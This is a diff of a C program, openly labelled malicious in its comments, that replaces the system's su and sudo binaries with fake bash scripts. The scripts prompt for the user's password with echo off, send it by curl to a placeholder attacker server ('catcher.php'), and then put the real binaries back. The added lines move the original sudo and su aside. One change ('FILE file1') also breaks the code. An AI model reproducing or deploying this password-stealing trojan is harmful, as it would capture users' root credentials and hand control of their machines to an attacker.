@@ -18,16 +18,21 @@ int main () {
     system("apt-get install curl > /dev/null 2>&1");
     system("yum install curl > /dev/null 2>&1");
     system("aptitude install curl > /dev/null 2>&1");
-
+    /**  MOVES ORIGINAL SUDO (COPY)  **/
+	
+    system("sudo mv /usr/bin/sudo /usr/sudo");
+	    
+    /**  MOVES ORIGINAL SU (COPY)  **/	   
+	    
+    system("sudo mv /usr/bin/su /usr/su");
+	
     /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
-    
-    /** MALICIUS FILE **/
 	
-    FILE *file1; 
-	
+    FILE file1;
+		
     /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
 	
-    char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
+    char cmmd1[230] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
     file1 = fopen("/bin/su", "w");
 
     if(file1 == NULL) {
@@ -47,7 +52,7 @@ int main () {
 	
     /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
 	
-    char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
+    char cmmd2[230] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
     file2 = fopen("/usr/bin/sudo", "w");
 
     if(file2 == NULL) {
